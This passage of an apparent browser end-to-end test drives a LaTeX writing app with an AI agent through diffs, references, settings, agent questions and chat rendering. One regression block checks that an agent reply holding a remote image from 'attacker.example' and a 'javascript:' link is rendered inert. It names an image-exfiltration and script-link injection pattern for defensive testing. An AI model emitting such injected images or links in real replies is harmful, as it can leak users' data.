      (await page.getByRole("button", { name: "Back to dashboard" }).count()) > 0 &&
      (await page.getByText("manual tweak from ui-verify").filter({ visible: true }).count()) > 0;
    // Leave: confirming navigates to the dashboard — nothing is lost, the
    // pending diff is still on disk and shows again once the project reopens.
    await page.getByRole("button", { name: "Back to the project dashboard" }).click();
    await leaveDlg.waitFor({ timeout: 5_000 });
    await leaveDlg.getByRole("button", { name: "Go to dashboard" }).click();
    await page.locator(".card-grid").first().waitFor({ timeout: 10_000 });
    const leaveWarnLeaveOk = (await page.locator(".card-grid").count()) > 0;
    await shot("25a2-leave-confirmed");
    await page.getByRole("button", { name: "Open Mock Thesis" }).click();
    await page.getByRole("button", { name: "Back to dashboard" }).waitFor({ timeout: 10_000 });
    await page
      .getByText("manual tweak from ui-verify")
      .filter({ visible: true })
      .first()
      .waitFor({ timeout: 10_000 });

    // ---- Partial rejection: two files pending → discard one file, then one hunk ----
    // Second manual edit via the file PUT endpoint (main.tex already carries the
    // editor tweak above), so the proof shows two independent files.
    const putRes = await afetch(`${apiBase}/projects/${mockProjectId}/file`, {
      method: "PUT",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        path: "sections/refs.bib",
        content: REFS_BIB + "% refs tweak from ui-verify\n",
      }),
    });
    if (!putRes.ok) throw new Error(`PUT sections/refs.bib failed: ${putRes.status}`);

    // The PUT bypasses the websocket — reload so the proof picks up both files.
    await page.reload();
    await page.getByRole("button", { name: "Back to dashboard" }).waitFor({ timeout: 10_000 });
    await page.getByText("manual tweak from ui-verify").filter({ visible: true }).first().waitFor({ timeout: 10_000 });
    await page.getByText("refs tweak from ui-verify").filter({ visible: true }).first().waitFor({ timeout: 10_000 });
    await shot("25b-proof-two-files");

    // Discard the refs.bib file (confirm-on-second-click), keep main.tex.
    await page.getByRole("button", { name: "Discard changes to sections/refs.bib" }).click();
    await page.getByRole("button", { name: "Really discard changes to sections/refs.bib?" }).click();
    await page
      .getByRole("button", { name: "Discard changes to sections/refs.bib" })
      .waitFor({ state: "detached", timeout: 10_000 });
    await page.waitForTimeout(300);
    const rejectFileUiOk =
      (await page.getByText("refs tweak from ui-verify").filter({ visible: true }).count()) === 0 &&
      (await page.getByText("manual tweak from ui-verify").filter({ visible: true }).count()) > 0;
    const rejectFileContentOk =
      (await getFile("sections/refs.bib")) === REFS_BIB &&
      (await getFile("main.tex")).includes("manual tweak from ui-verify");
    await shot("25c-proof-file-discarded");

    // The hunk's ↗ opens that exact line in the Source editor for manual
    // tweaks (the pending diff stays untouched).
    const jumpBtn = page.getByRole("button", { name: /^Open main\.tex line \d+ in the editor$/ }).filter({ visible: true });
    await jumpBtn.first().waitFor({ timeout: 10_000 });
    await jumpBtn.first().click();
    // Source opens with the changed line revealed and flashed.
    const proofJumpOk = await page
      .waitForFunction(
        () => {
          const flash = document.querySelector(".cm-flash-line");
          const content = [...document.querySelectorAll(".cm-content")].find(
            (c) => (c as HTMLElement).offsetParent !== null,
          );
          return Boolean(flash && content && content.textContent?.includes("manual tweak from ui-verify"));
        },
        { timeout: 10_000 },
      )
      .then(() => true)
      .catch(() => false);
    await shot("25b2-proof-jump-to-source");
    // Quoting from the SOURCE (not just the PDF): select text in the editor,
    // the chip appears, and the draft names the file:line it came from.
    await leftPane().getByRole("tab", { name: "Chat", exact: true }).click();
    await aside().getByRole("tab", { name: "Source", exact: true }).click();
    await aside().locator(".cm-content").first().waitFor({ state: "visible", timeout: 15_000 });
    await page.evaluate(() => {
      const content = [...document.querySelectorAll('aside[data-pane="right"] .cm-content')].find(
        (c) => (c as HTMLElement).offsetParent !== null,
      );
      const line = content?.querySelector(".cm-line");
      if (!line) return;
      const sel = window.getSelection()!;
      sel.removeAllRanges();
      const range = document.createRange();
      range.selectNodeContents(line);
      sel.addRange(range);
      line.dispatchEvent(new MouseEvent("mouseup", { bubbles: true, cancelable: true }));
    });
    const srcChip = page.getByRole("button", { name: "❝ quote in chat" }).filter({ visible: true });
    const sourceQuoteChipOk = await srcChip
      .first()
      .waitFor({ timeout: 5_000 })
      .then(() => true)
      .catch(() => false);
    let sourceQuoteDraftOk = false;
    if (sourceQuoteChipOk) {
      await srcChip.first().click();
      await page
        .waitForFunction(
          () => {
            const el = [...document.querySelectorAll("textarea")].find((t) =>
              t.placeholder.includes("Ask BlattBot"),
            );
            return Boolean(el && /\(from .+\.tex:\d+\)/.test(el.value));
          },
          { timeout: 5_000 },
        )
        .catch(() => {});
      const draft = await page.getByPlaceholder(/Ask BlattBot/).inputValue();
      // Names the file and line, not "the PDF".
      sourceQuoteDraftOk = /\(from .+\.tex:\d+\)/.test(draft) && !draft.includes("(from the PDF)");
      await page.getByPlaceholder(/Ask BlattBot/).fill("");
      await shot("42c-source-quote");
    }

    // Restore the layout the rest of the flow expects (chat left, proof right):
    // the jump put Source into a pane, which displaced one of them.
    await leftPane().getByRole("tab", { name: "Chat", exact: true }).click();
    await aside().getByRole("tab", { name: "Proof", exact: true }).click();
    await page.getByText("manual tweak from ui-verify").filter({ visible: true }).first().waitFor({ timeout: 10_000 });

    // Discard main.tex's remaining hunk via its × (server reverse-applies the
    // patch the client reconstructed from the diff) — the proof empties out.
    await page.getByRole("button", { name: "Discard this change in main.tex" }).click();
    await page.getByRole("button", { name: "Really discard this change in main.tex?" }).click();
    await page.getByText("No pending changes").filter({ visible: true }).first().waitFor({ timeout: 10_000 });
    const rejectHunkContentOk = (await getFile("main.tex")) === MAIN_TEX;
    // With the proof empty again (and no turn running) the tab-close guard
    // must disarm — a clean state never nags.
    await page
      .waitForFunction(
        () => {
          const ev = new Event("beforeunload", { cancelable: true });
          window.dispatchEvent(ev);
          return !ev.defaultPrevented;
        },
        { timeout: 5_000 },
      )
      .catch(() => {});
    const leaveUnloadClearedOk = await page.evaluate(() => {
      const ev = new Event("beforeunload", { cancelable: true });
      window.dispatchEvent(ev);
      return !ev.defaultPrevented;
    });
    await shot("25d-proof-hunk-discarded");

    // ---- References: cited entry renders leaf-green with a line-numbered jump ----
    await aside().getByRole("tab", { name: "References", exact: true }).click();
    const refChip = aside().getByRole("button", { name: "vaswani2017attention", exact: true });
    await refChip.waitFor({ timeout: 10_000 });
    // text-leaf (#8fb573) marks a cited entry's key chip.
    const refChipLeaf = await refChip.evaluate(
      (el) => getComputedStyle(el).color === "rgb(143, 181, 115)",
    );
    await aside().getByRole("button", { name: "Show where vaswani2017attention is cited" }).click();
    const occurrence = aside().getByRole("button", { name: "main.tex:8", exact: true });
    await occurrence.waitFor({ timeout: 5_000 });
    await shot("25e-refs-usage");

    // Clicking the occurrence activates the Source tab, scrolls to and flashes the line.
    await occurrence.click();
    await aside().locator(".cm-flash-line").first().waitFor({ timeout: 10_000 });
    const sourceTabActive = await aside()
      .getByRole("tab", { name: "Source", exact: true })
      .evaluate((el) => el.className.includes("bg-ink-2"));
    const citeJumpOk =
      sourceTabActive &&
      (await aside().locator(".cm-content").first().innerText()).includes(
        "\\cite{vaswani2017attention}",
      );
    await shot("25f-refs-jump");

    // ---- Add a reference by hand → the .bib diff lands in the Proof ----
    await aside().getByRole("tab", { name: "References", exact: true }).click();
    await aside().getByRole("button", { name: "+ add entry" }).click();
    const NEW_REF = `@misc{uiverify2024note,
  title = {Tiny Test Note},
  author = {UI Verify},
  year = {2024}
}`;
    await aside().getByRole("textbox", { name: "New BibTeX entry" }).fill(NEW_REF);
    await aside().getByRole("button", { name: "Save new entry" }).click();
    // The broadcast diff flips the view to the Proof tab showing the .bib change.
    await page.getByText("Tiny Test Note").filter({ visible: true }).first().waitFor({ timeout: 10_000 });
    const addProofOk =
      (await page.getByText("sections/refs.bib").filter({ visible: true }).count()) > 0;
    await shot("25g-refs-added-proof");

    // Back on References the new entry is amber/unused (never cited).
    await aside().getByRole("tab", { name: "References", exact: true }).click();
    const newChip = aside().getByRole("button", { name: "uiverify2024note", exact: true });
    await newChip.waitFor({ timeout: 10_000 });
    const newChipGold = await newChip.evaluate(
      (el) => getComputedStyle(el).color === "rgb(207, 167, 91)",
    );
    const newRow = aside()
      .locator("li")
      .filter({ has: page.getByRole("button", { name: "uiverify2024note", exact: true }) });
    const unusedBadgeOk = (await newRow.getByText("unused", { exact: true }).count()) > 0;
    await shot("25h-refs-added-unused");

    // ---- Edit the entry's raw BibTeX (title change) → the proof follows ----
    await newRow.getByRole("button", { name: "Edit uiverify2024note" }).click();
    const editBox = aside().getByRole("textbox", { name: "BibTeX source of uiverify2024note" });
    await editBox.waitFor({ timeout: 5_000 });
    await editBox.fill(NEW_REF.replace("Tiny Test Note", "Tiny Edited Note"));
    await aside().getByRole("button", { name: "Save changes to uiverify2024note" }).click();
    // The save closes the editor, reloads the list, and the broadcast flips to Proof.
    await editBox.waitFor({ state: "detached", timeout: 10_000 });
    await page.getByText("Tiny Edited Note").filter({ visible: true }).first().waitFor({ timeout: 10_000 });
    const staleTitle = page.getByText("Tiny Test Note").filter({ visible: true });
    const editProofOk = (await staleTitle.count()) === 0;
    if (!editProofOk) {
      console.log(
        "  [stale Tiny Test Note]",
        await staleTitle.evaluateAll((els) => els.map((el) => el.outerHTML.slice(0, 300))),
      );
    }
    await shot("25i-refs-edited-proof");

    // ---- Delete it (confirm-on-second-click) → the proof empties back out ----
    await aside().getByRole("tab", { name: "References", exact: true }).click();
    await aside().getByRole("button", { name: "Delete uiverify2024note" }).click();
    await aside().getByRole("button", { name: "Really delete uiverify2024note?" }).click();
    await aside()
      .getByRole("button", { name: "Delete uiverify2024note" })
      .waitFor({ state: "detached", timeout: 10_000 });
    await aside().getByRole("tab", { name: "Proof", exact: false }).click();
    await page.getByText("No pending changes").filter({ visible: true }).first().waitFor({ timeout: 10_000 });
    // The .bib file is byte-identical to the pre-add state on disk.
    const refsBibRestored = (await getFile("sections/refs.bib")) === REFS_BIB;
    await shot("25j-refs-deleted");

    // ---- Rendered PDF diff: a visible edit → changed-page chips + region boxes ----
    // (a comment-only tweak would produce no visual change — edit real text)
    const putRendered = await afetch(`${apiBase}/projects/${mockProjectId}/file`, {
      method: "PUT",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        path: "main.tex",
        content: MAIN_TEX.replace(
          "The approach compiles reliably.",
          "The approach compiles reliably and reproducibly.",
        ),
      }),
    });
    if (!putRendered.ok) throw new Error(`PUT main.tex failed: ${putRendered.status}`);
    // The PUT bypasses the websocket — reload so the proof (still the right
    // pane's stored tab) picks up the pending diff.
    await page.reload();
    await page.getByRole("button", { name: "Back to dashboard" }).waitFor({ timeout: 10_000 });
    await page.getByText("reproducibly").filter({ visible: true }).first().waitFor({ timeout: 10_000 });
    const textToggle = aside().getByRole("tab", { name: "Text diff", exact: true });
    const renderedToggle = aside().getByRole("tab", { name: "Rendered diff", exact: true });
    const diffToggleOk = (await textToggle.count()) === 1 && (await renderedToggle.count()) === 1;
    // Entering rendered mode compiles the approval base (HEAD) server-side,
    // recompiles the (stale) working state, and pixel-compares client-side —
    // real tectonic runs on both sides, hence the generous timeout.
    await renderedToggle.click();
    const changedChip = aside().getByRole("button", { name: "Changed page 3" });
    await changedChip.waitFor({ timeout: 180_000 });
    const renderedChipsOk = (await changedChip.count()) === 1;
    // Only the conclusion page changed — pages 1 and 2 must not be listed.
    const renderedOnlyP3 =
      (await aside().getByRole("button", { name: "Changed page 1" }).count()) === 0 &&
      (await aside().getByRole("button", { name: "Changed page 2" }).count()) === 0;
    // The current page renders with red boxes around the changed region.
    await aside().locator("[data-diff-box]").first().waitFor({ timeout: 10_000 });
    const renderedBoxesOk = (await aside().locator("[data-diff-box]").count()) >= 1;
    await shot("25k-rendered-diff");
    // Discard the edit through the API; the rejected broadcast empties the
    // proof live (no reload needed) and the tree returns to the seeded state.
    const rejRendered = await afetch(`${apiBase}/projects/${mockProjectId}/reject`, {
      method: "POST",
    });
    if (!rejRendered.ok) throw new Error(`reject failed: ${rejRendered.status}`);
    await page.getByText("No pending changes").filter({ visible: true }).first().waitFor({ timeout: 10_000 });
    const renderedRestoredOk = (await getFile("main.tex")) === MAIN_TEX;
    await shot("25l-rendered-diff-discarded");

    await aside().getByRole("tab", { name: "Source", exact: true }).click();

    // ---- Scope selector: checking a file shows the chip on the composer ----
    await page.getByRole("checkbox", { name: "Scope main.tex" }).check();
    await page.getByText("scope: main.tex").waitFor({ timeout: 5_000 });
    const scopeSummary = await page.locator("nav").first().innerText();
    const scopeChipOk = scopeSummary.includes("1 file");
    await shot("26-scope-chip");
    await page.getByRole("button", { name: "Clear scope", exact: true }).click();
    const scopeCleared = (await page.getByText("scope: main.tex").count()) === 0;

    // ---- The right panel resizes by dragging the separator ----
    const widthBefore = await aside().evaluate((el) => el.getBoundingClientRect().width);
    const sep = page.getByRole("separator", { name: "Resize panel" });
    const box = (await sep.boundingBox())!;
    await page.mouse.move(box.x + 2, box.y + 300);
    await page.mouse.down();
    await page.mouse.move(box.x - 160, box.y + 300, { steps: 6 });
    await page.mouse.up();
    const widthAfter = await aside().evaluate((el) => el.getBoundingClientRect().width);
    await shot("27-resized");

    // ---- W7 a11y: the separator is focusable; arrows move the split ~2%/press ----
    await sep.focus();
    const sepFocused = await sep.evaluate((el) => document.activeElement === el);
    for (let i = 0; i < 3; i++) await page.keyboard.press("ArrowLeft");
    const widthKeyboard = await aside().evaluate((el) => el.getBoundingClientRect().width);
    // 3 presses × ~2% of a 1500px window ≈ 90px — well past drift/rounding.
    const keyboardResizeOk = sepFocused && widthKeyboard - widthAfter > 40;
    await shot("27b-resized-keyboard");

    // ---- Settings: accounts (with the email from the mock), agent config, transparency ----
    await page.getByRole("button", { name: "Open settings" }).click();
    await page.getByText("mock@example.org").filter({ visible: true }).first().waitFor({ timeout: 10_000 });
    await shot("28-settings-accounts");
    await page.getByRole("dialog", { name: "Settings" }).getByRole("button", { name: "Agent" }).click();
    await page.getByText("API base URL").waitFor({ timeout: 5_000 });
    await shot("29-settings-agent");

    // ---- Backend picker: two radio cards; switching persists via /api/settings ----
    const settingsDlg = page.getByRole("dialog", { name: "Settings" });
    const claudeRadio = settingsDlg.getByRole("radio", { name: "Claude Code (Agent SDK)" });
    const openaiRadio = settingsDlg.getByRole("radio", { name: "OpenAI-compatible API" });
    const backendPickerOk =
      (await claudeRadio.count()) === 1 &&
      (await openaiRadio.count()) === 1 &&
      (await claudeRadio.isChecked()) &&
      !(await openaiRadio.isChecked());
    await openaiRadio.check();
    // The openai fields replace the claude ones (base URL with the local-server hint).
    await settingsDlg.getByPlaceholder("http://127.0.0.1:11434/v1").waitFor({ timeout: 5_000 });
    const backendFieldsSwapOk = (await settingsDlg.getByText("API base URL").count()) === 0;
    await shot("29b-settings-backend-openai");
    await settingsDlg.getByRole("button", { name: "Save settings" }).click();
    await settingsDlg.getByText("Saved.").waitFor({ timeout: 5_000 });
    const getBackend = async () =>
      ((await (await afetch(`${apiBase}/settings`)).json()) as { backend: string }).backend;
    const backendAfterOpenai = await getBackend();
    // Switch back to Claude and save — the claude fields return.
    await claudeRadio.check();
    await settingsDlg.getByText("API base URL").waitFor({ timeout: 5_000 });
    await settingsDlg.getByRole("button", { name: "Save settings" }).click();
    await settingsDlg.getByText("Saved.").waitFor({ timeout: 5_000 });
    const backendAfterClaude = await getBackend();
    // Reset to the stored default ("" = claude) so the rest of the flow is untouched.
    await afetch(`${apiBase}/settings`, {
      method: "PUT",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ backend: "" }),
    });
    const backendReset = await getBackend();
    const backendSwitchOk =
      backendAfterOpenai === "openai" && backendAfterClaude === "claude" && backendReset === "";

    await page.getByRole("dialog", { name: "Settings" }).getByRole("button", { name: "Transparency" }).click();
    await page.getByText("compile_latex").filter({ visible: true }).first().waitFor({ timeout: 5_000 });
    const transparencyText = await page.getByRole("dialog", { name: "Settings" }).innerText();
    const settingsOk =
      transparencyText.includes("expert LaTeX writing assistant") &&
      transparencyText.includes("search_papers");
    await shot("30-settings-transparency");
    await page.getByRole("button", { name: "Close settings" }).click();
    await page.getByRole("dialog", { name: "Settings" }).waitFor({ state: "detached", timeout: 5_000 });

    // ---- AskUserQuestion (W9): the agent asks mid-turn; card → answer → echo ----
    // Point the openai backend at the local ask-mock through the Settings UI,
    // send a chat message, and the mock's ask_user call must surface as an
    // actionable question card that survives a reload while pending.
    await page.getByRole("button", { name: "Open settings" }).click();
    const askDlg = page.getByRole("dialog", { name: "Settings" });
    await askDlg.getByRole("button", { name: "Agent" }).click();
    await askDlg.getByRole("radio", { name: "OpenAI-compatible API" }).check();
    await askDlg.getByPlaceholder("http://127.0.0.1:11434/v1").fill(`http://127.0.0.1:${ASK_PORT}/v1`);
    await askDlg.getByPlaceholder(/llama3\.3:70b/).fill("ask-verify-model");
    await askDlg.getByRole("button", { name: "Save settings" }).click();
    await askDlg.getByText("Saved.").waitFor({ timeout: 5_000 });
    await page.getByRole("button", { name: "Close settings" }).click();
    await askDlg.waitFor({ state: "detached", timeout: 5_000 });

    await page.getByPlaceholder(/Ask BlattBot/).fill("Improve one section of the thesis");
    await page.getByRole("button", { name: "Send", exact: true }).click();
    const askQuestionText = () =>
      leftPane().getByText("Which section should I improve?").filter({ visible: true });
    const askIntroOption = () =>
      leftPane().getByRole("button", { name: "Introduction" }).filter({ visible: true });
    await askQuestionText().first().waitFor({ timeout: 20_000 });
    await askIntroOption().first().waitFor({ timeout: 10_000 });
    const askCardOk =
      (await askIntroOption().count()) > 0 &&
      (await leftPane().getByRole("button", { name: "Conclusion" }).filter({ visible: true }).count()) > 0 &&
      (await leftPane().getByText("Section", { exact: true }).filter({ visible: true }).count()) > 0 &&
      (await leftPane().getByRole("button", { name: "Skip these questions" }).filter({ visible: true }).count()) > 0 &&
      (await leftPane().getByPlaceholder("Other…").filter({ visible: true }).count()) > 0;
    await shot("30b-question-card");

    // Reload MID-PENDING: the turn-state payload re-arms the actionable card.
    await page.reload();
    await page.getByRole("button", { name: "Back to dashboard" }).waitFor({ timeout: 10_000 });
    await askQuestionText().first().waitFor({ timeout: 10_000 });
    await askIntroOption().first().waitFor({ timeout: 10_000 });
    const askRestoredOk = (await askIntroOption().count()) > 0;
    await shot("30c-question-restored");

    // Answer → the turn resumes and the reply echoes the chosen label.
    await askIntroOption().first().click();
    await leftPane()
      .getByText(/focus on the Introduction/)
      .filter({ visible: true })
      .first()
      .waitFor({ timeout: 20_000 });
    const askAnsweredOk =
      (await leftPane().getByText(/focus on the Introduction/).filter({ visible: true }).count()) > 0;
    await leftPane().getByText("turn complete").filter({ visible: true }).first().waitFor({ timeout: 10_000 });
    // The card collapsed: option buttons are gone, the muted summary remains.
    const askCollapsedOk =
      (await askIntroOption().count()) === 0 &&
      (await leftPane().getByText("answered", { exact: true }).filter({ visible: true }).count()) > 0 &&
      (await askQuestionText().count()) > 0;
    await shot("30d-question-answered");

    // ---- Markdown + math: the echoed reply carries MD_ECHO — assert the
    // rendered DOM, not the source: KaTeX output (inline AND display), a real
    // <strong>, raw markers invisible outside code, the fence byte-literal,
    // and the lone currency dollar left untouched by remark-math.
    const mdStrongOk =
      (await leftPane()
        .locator(".prose-agent strong", { hasText: "bold text" })
        .filter({ visible: true })
        .count()) > 0;
    const mdMath = await leftPane().evaluate((root) => {
      const all = [...root.querySelectorAll(".prose-agent .katex")];
      return {
        inline: all.filter((k) => !k.closest(".katex-display")).length,
        display: root.querySelectorAll(".prose-agent .katex-display").length,
      };
    });
    const mdInlineMathOk = mdMath.inline >= 2;
    const mdDisplayMathOk = mdMath.display >= 1;
    const mdNoRawOk =
      (await leftPane().getByText("$d(v)$").filter({ visible: true }).count()) === 0 &&
      (await leftPane().getByText("**bold text**").filter({ visible: true }).count()) === 0;
    const mdCodeLiteralOk =
      (await leftPane()
        .getByText("code keeps its literal $x$ and **markers**")
        .filter({ visible: true })
        .count()) > 0;
    const mdCurrencyOk =
      (await leftPane().getByText("this costs $5 in total").filter({ visible: true }).count()) > 0;
    await shot("30d2-markdown-math");

    // ---- F1 regression: the echoed reply carries a remote image and a
    // javascript: link — the image must render as an inert alt+host chip
    // (no <img>, no preload hint, no network request), the link no href.
    const f1NoImgOk =
      (await page.locator('img[src^="http"]').count()) === 0 &&
      (await page.locator('link[rel="preload"][as="image"]').count()) === 0;
    const f1ChipOk =
      (await leftPane()
        .locator(".md-img-chip", { hasText: "attacker.example" })
        .filter({ visible: true })
        .count()) > 0;
    const f1JsLinkOk =
      (await page.locator('a[href^="javascript"]').count()) === 0 &&
      (await leftPane().getByText("boom").filter({ visible: true }).count()) > 0;
    const f1NoRequestOk = attackerRequests.length === 0;

    // ---- F2: the unpaired \[ lookalike stays literal prose while the real
    // \[x=1\] line renders as display math. F3: the indented code block keeps
    // its literal \(x\). F4: ONE list survives around its display equation.
    const f2PreservedOk =
      (await leftPane().getByText("\\[4pt] for spacing").filter({ visible: true }).count()) > 0 &&
      (await leftPane().getByText("$$4pt]").count()) === 0;
    const f2DisplayOk = await leftPane().evaluate((root) =>
      [...root.querySelectorAll(".prose-agent .katex-display annotation")].some((a) =>
        (a.textContent ?? "").includes("x=1"),
      ),
    );
    const f3IndentedOk =
      (await leftPane()
        .getByText("indented code keeps \\(x\\) raw")
        .filter({ visible: true })
        .count()) > 0;
    const f4List = await leftPane().evaluate((root) => {
      const uls = [...root.querySelectorAll(".prose-agent ul")].filter((ul) =>
        (ul.textContent ?? "").includes("first bullet"),
      );
      return {
        count: uls.length,
        both: uls.some((ul) => (ul.textContent ?? "").includes("second bullet")),
        display: uls.some((ul) => ul.querySelector(".katex-display") !== null),
      };
    });
    const f4ListOk = f4List.count === 1 && f4List.both && f4List.display;
    // (F5 — the empty-box flash while a display equation streams — is timing-
    // dependent and not deterministically assertable in this end-to-end flow;
    // it is pinned by the unit tests in test/markdown.test.tsx instead.)
    await shot("30d3-chat-hardening");

    // ---- Job B: `main.tex:3` (an existing file, inside a code span) links
    // into the Source pane and flashes the line; nonexistent.tex:9 stays
    // plain; the blockquote's "find in source" locates the quoted passage.
    const fileLink = leftPane().locator("a.md-file-link", { hasText: "main.tex:3" });
    const linkRenderedOk =
      (await fileLink.count()) > 0 &&
      (await leftPane().locator("code a.md-file-link", { hasText: "main.tex:3" }).count()) > 0;
    const plainNonexistentOk =
      (await leftPane().getByText("nonexistent.tex:9").filter({ visible: true }).count()) > 0 &&
      (await leftPane().locator("a", { hasText: "nonexistent.tex" }).count()) === 0;
    await fileLink.first().click();
    await aside().locator(".cm-flash-line").first().waitFor({ timeout: 10_000 });
    const linkJumpOk =
      (await aside()
        .getByRole("tab", { name: "Source", exact: true })
        .evaluate((el) => el.className.includes("bg-ink-2"))) &&
      (await aside().getByText("Ln 3, Col 1").count()) > 0;
    await shot("30d4-file-link-jump");
    // The flash decoration clears itself — wait so the next jump gets a fresh one.
    await aside().locator(".cm-flash-line").waitFor({ state: "detached", timeout: 5_000 });

    const findSourceBtn = leftPane().getByRole("button", { name: "find in source" });
    const quoteActionOk = (await findSourceBtn.count()) > 0;
    // No PDF pane is visible right now — the PDF action must not be offered.
    const noPdfActionOk =
      (await leftPane().getByRole("button", { name: "find in PDF" }).count()) === 0;
    await findSourceBtn.first().click();
    await aside().locator(".cm-flash-line").first().waitFor({ timeout: 10_000 });
    // The quoted sentence lives on main.tex line 8.
    const quoteJumpOk = (await aside().getByText("Ln 8, Col 1").count()) > 0;
    await shot("30d5-quote-find-source");

    // ---- Job B: with a PDF pane visible the same blockquote also offers
    // "find in PDF", which highlights the passage in the rendered text layer.
    await aside().getByRole("tab", { name: "PDF", exact: true }).click();
    await aside().locator("canvas").first().waitFor({ state: "visible", timeout: 120_000 });
    // Showing the PDF auto-recompiles (the turn dirtied the tree) — wait for
    // the indicator to appear (tolerated if it never does) and clear, then
    // let the reloaded document settle so the find runs on stable pages.
    await page
      .getByText(/Compiling…/)
      .filter({ visible: true })
      .first()
      .waitFor({ timeout: 5_000 })
      .catch(() => {});
    await page.waitForFunction(() => !document.body.innerText.includes("Compiling…"), {
      timeout: 180_000,
    });
    await page.waitForTimeout(1_000);
    await aside().locator(".textLayer span").first().waitFor({ timeout: 60_000 });
    const findPdfBtn = leftPane().getByRole("button", { name: "find in PDF" });
    await findPdfBtn.first().waitFor({ timeout: 10_000 });
    await findPdfBtn.first().click();
    await aside().locator(".textLayer span.pdf-find-flash").first().waitFor({ timeout: 15_000 });
    const pdfFindOk = (await aside().locator(".textLayer span.pdf-find-flash").count()) > 0;
    await shot("30d6-quote-find-pdf");
    // Restore the layout the rest of the flow expects (right pane on Source).
    await aside().getByRole("tab", { name: "Source", exact: true }).click();
    await aside().locator(".cm-content").first().waitFor({ state: "visible", timeout: 15_000 });

    // ---- Skip path: the second turn asks again; the user skips — the
    // declined tool result must reach the model (the mock echoes it) and the
    // card must collapse to its muted "skipped" summary.
    await page.getByPlaceholder(/Ask BlattBot/).fill("Anything else worth improving?");
    await page.getByRole("button", { name: "Send", exact: true }).click();
    const skipQuestionText = () =>
      leftPane().getByText("Should I also polish the abstract?").filter({ visible: true });
    const skipButton = () =>
      leftPane().getByRole("button", { name: "Skip these questions" }).filter({ visible: true });
    await skipQuestionText().first().waitFor({ timeout: 20_000 });
    await skipButton().first().waitFor({ timeout: 10_000 });
    await shot("30e-question-skip-pending");
    await skipButton().first().click();
    // The dismiss travels App.dismissQuestion → POST …/dismiss → registry →
    // the openai loop's {declined: true} tool result → the mock's echo.
    await leftPane()
      .getByText(/proceeding with my best judgment/)
      .filter({ visible: true })
      .first()
      .waitFor({ timeout: 20_000 });
    const askSkipEchoOk =
      (await leftPane().getByText(/proceeding with my best judgment/).filter({ visible: true }).count()) > 0;
    // Second turn complete (the first one's marker is still in the chat).
    await leftPane().getByText("turn complete").filter({ visible: true }).nth(1).waitFor({ timeout: 10_000 });
    const askSkippedCollapsedOk =
      (await skipButton().count()) === 0 &&
      (await leftPane().getByRole("button", { name: "Yes, polish it" }).filter({ visible: true }).count()) === 0 &&
      (await leftPane().getByText("skipped", { exact: true }).filter({ visible: true }).count()) > 0 &&
      (await skipQuestionText().count()) > 0;
    await shot("30f-question-skipped");

    // ---- W10: images in chat — paste → thumbnail → send → bubble → reload ----
    // The paste is simulated with a real DataTransfer so the composer's own
    // onPaste path runs (screenshots are the common case).
    const imgComposer = () => page.getByPlaceholder(/Ask BlattBot/).filter({ visible: true }).first();
    await imgComposer().click();
    await page.evaluate((b64) => {
      const bytes = Uint8Array.from(atob(b64), (c) => c.charCodeAt(0));
      const file = new File([bytes], "screenshot.png", { type: "image/png" });
      const dt = new DataTransfer();
      dt.items.add(file);
      const areas = [...document.querySelectorAll<HTMLTextAreaElement>("textarea")].filter(
        (t) => t.offsetParent !== null && (t.placeholder ?? "").includes("Ask BlattBot"),
      );
      areas[0].dispatchEvent(
        new ClipboardEvent("paste", { clipboardData: dt, bubbles: true, cancelable: true }),
      );
    }, PASTE_PNG_B64);

    // The pending thumbnail (with its remove ×) appears above the input.
    const pendingThumb = () => leftPane().getByAltText("screenshot.png").filter({ visible: true });
    await pendingThumb().first().waitFor({ timeout: 10_000 });
    const imgPasteThumbOk =
      (await pendingThumb().count()) === 1 &&
      (await leftPane().getByRole("button", { name: "Remove screenshot.png" }).filter({ visible: true }).count()) === 1 &&
      (await leftPane().getByText("1 of 4 image").filter({ visible: true }).count()) === 1 &&
      (await leftPane().getByRole("button", { name: "Attach images" }).filter({ visible: true }).count()) === 1;
    await shot("30i-image-pending");

    // Removing it clears the row; paste again to actually send one.
    await leftPane().getByRole("button", { name: "Remove screenshot.png" }).first().click();
    const imgRemoveOk = (await pendingThumb().count()) === 0;
    await page.evaluate((b64) => {
      const bytes = Uint8Array.from(atob(b64), (c) => c.charCodeAt(0));
      const dt = new DataTransfer();
      dt.items.add(new File([bytes], "screenshot.png", { type: "image/png" }));
      const areas = [...document.querySelectorAll<HTMLTextAreaElement>("textarea")].filter(
        (t) => t.offsetParent !== null && (t.placeholder ?? "").includes("Ask BlattBot"),
      );
      areas[0].dispatchEvent(
        new ClipboardEvent("paste", { clipboardData: dt, bubbles: true, cancelable: true }),
      );
    }, PASTE_PNG_B64);
    await pendingThumb().first().waitFor({ timeout: 10_000 });

    const imagesBefore = askMock.images.length;
    await imgComposer().fill("What is wrong with this figure?");
    await page.getByRole("button", { name: "Send", exact: true }).click();
    await leftPane()
      .getByText(/Received 1 attached image/)
      .filter({ visible: true })
      .first()
      .waitFor({ timeout: 20_000 });

    // The model really received the bytes as an image part.
    const sentImages = askMock.images.slice(imagesBefore);
    const imgSentToModelOk =
      sentImages.length === 1 &&
      sentImages[0].mime === "image/png" &&
      sentImages[0].bytes === PASTE_PNG_BYTES;
    // …the composer cleared, and the user bubble renders the stored image.
    const bubbleImg = () => leftPane().locator('img[src*="/chat-image/"]').filter({ visible: true });
    await bubbleImg().first().waitFor({ timeout: 10_000 });
    const imgComposerClearedOk = (await pendingThumb().count()) === 0;
    const imgBubbleOk = await bubbleImg()
      .first()
      .evaluate((el: HTMLImageElement) => el.complete && el.naturalWidth === 96 && el.naturalHeight === 64);
    await shot("30j-image-sent");

    // Clicking the thumbnail opens the full-size view in the app's own dialog.
    await bubbleImg().first().click();
    const viewer = page.getByRole("dialog", { name: /Attached image 1 of 1/ });
    await viewer.waitFor({ timeout: 5_000 });
    const imgDialogOk = (await viewer.locator('img[src*="/chat-image/"]').count()) === 1;
    await shot("30k-image-fullsize");
    await page.keyboard.press("Escape");
    await viewer.waitFor({ state: "detached", timeout: 5_000 });

    // The attachment survives a reload — it is persisted on the transcript.
    await page.reload();
    await page.getByRole("button", { name: "Back to dashboard" }).waitFor({ timeout: 10_000 });
    await page
      .locator('img[src*="/chat-image/"]')
      .filter({ visible: true })
      .first()
      .waitFor({ timeout: 15_000 });
    const imgRestoredOk =
